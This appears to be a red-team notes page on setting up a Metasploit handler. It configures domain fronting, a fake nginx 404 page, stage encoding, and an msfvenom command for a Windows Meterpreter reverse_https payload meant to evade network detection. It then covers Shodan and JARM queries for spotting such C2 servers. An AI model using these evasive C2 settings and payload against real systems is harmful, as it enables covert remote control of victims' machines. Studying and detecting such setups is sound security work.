# Metasploit

Search Tag: #red-team-infrastructure

## 01 - Setup

### 1.1 - Shell Handler

#### 1.1.1 - Domain Fronting

```
msf exploit(multi/handler) > set HttpHostHeader afsa0dfna0sdfhq3.cloudfront.net

msf exploit(multi/handler) > set HttpUserAgent <User Agent>

msf exploit(multi/handler) > set HttpServerName nginx/1.21.2

msf exploit(multi/handler) > set HttpUnknownRequestResponse <html><head><title>404 Not Found</title></head><body><p><h1 align="center">404 Not Found</h1></p><br><p><hr></p><p align="center">nginx/1.21.2</p></body></html>
```

#### 1.1.2 - The URI length for the stager (at least 5 bytes)

```
msf exploit(multi/handler) > set StagerURILength 420

msf exploit(multi/handler) > set HandlerSSLCert /path/to/cert.pem

msf exploit(multi/handler) > set SSLVersion TLS1.2

msf exploit(multi/handler) > set EnableStageEncoding true

msf exploit(multi/handler) > set StageEncoder x64/zutto_dekiru
```

`$ msfvenom -p windows/x64/meterpreter/reverse_https StagerURILength=420 HandlerSSLCert=/path/to/cert.pem`

* Optional payload advanced settings

```
msf exploit(multi/handler) > set HttpHostHeader

msf exploit(multi/handler) > set HttpCookie
```

### 1.2 - Firewall Rules

```
# mkdir /etc/iptables
# iptables -I INPUT 1 -p tcp -s 0.0.0.0/0 --dport 5432 -j DROP
# iptables -I INPUT 1 -p tcp -s 127.0.0.1 --dport 5432 -j ACCEPT
# iptables-save > /etc/iptables/rules.v4
```

- A script to autorun after reboot. Run this as root (without `sudo`)

```bash
cat << EOF > /etc/rc.firewall-rules
#!/bin/sh -e
#
# rc.firewall-rules
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.

sudo iptables-restore < /etc/iptables/rules.v4

exit 0
EOF
```

`$ sudo chmod +x /etc/rc.firewall-rules`

## 02 - Detection

### 2.1 - Shodan

`ssl:"MetasploitSelfSignedCA"`

### 2.2 - JARM

`$ git clone https://github.com/salesforce/jarm.git`

`$ cd jarm/`

`$ python jarm.py <C2_IP> -p 4444`

`$ python jarm.py <C2_IP> -p 443`

`$ python jarm.py <C2_IP> -p 80`

---
## References

- [Anti-Forensics Evading Network Detection with Metasploit](https://sapphirex00.medium.com/c2-antiforensics-evading-network-detection-with-metasploit-b400342f20b1)

- [Quickpost: Metasploit User Agent Strings](https://blog.didierstevens.com/2015/03/16/quickpost-metasploit-user-agent-strings/)

- [Catching Meterpreter Callbacks](https://github.com/bats3c/shad0w/wiki/Catching-Meterpreter-Callbacks)

- [Windows Exploit with Word Macro](https://zer0day.tistory.com/303)

- [Conti TTP using Atomic Red Team and Detection Lab C2 infrastructure Hunting](https://michaelkoczwara.medium.com/conti-ttps-using-atomic-red-team-and-detection-lab-c2-infrastructure-hunting-16d159fe0ed8)

- https://labs.jumpsec.com/obfuscating-c2-during-a-red-team-engagement/

- [Chapter 11 Visualizing Metasploit (Use case related about MSGRPC which is the msfrpcd when connecting metasploit remotely)](https://goois.net/chapter-11-visualizing-metasploit-mastering-metasploit-fourth-edition.html)

- [Hunting C2 with Shodan](https://michaelkoczwara.medium.com/hunting-c2-with-shodan-223ca250d06f)

- [JARM](https://github.com/salesforce/jarm)